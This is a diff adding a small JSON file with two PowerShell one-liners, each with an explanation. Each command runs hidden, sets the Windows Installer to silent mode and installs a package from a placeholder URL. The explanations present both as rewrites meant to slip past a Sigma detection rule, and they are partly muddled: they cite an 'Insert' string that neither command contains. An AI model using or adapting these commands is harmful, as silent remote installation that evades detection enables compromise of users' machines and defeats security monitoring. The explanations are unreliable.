@@ -1,0 +1,10 @@
+[
+  {
+    "output": "powershell -W Hidden -C \"$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u,'')\"",
+    "explanation": "Reordering: The command reorders the arguments to avoid the suspicious string 'Insert' while maintaining the same behavior."
+  },
+  {
+    "output": "powershell -W Hidden -C \"$u='https://example.com/';$i=New-Object -ComObject 'WindowsInstaller.Installer';$i.UILevel=2;$i.InstallProduct($u,'')\"",
+    "explanation": "Substitution: Replaced parentheses with spaces around the COM object string to avoid the 'Insert' keyword in the Sigma rule."
+  }
+]
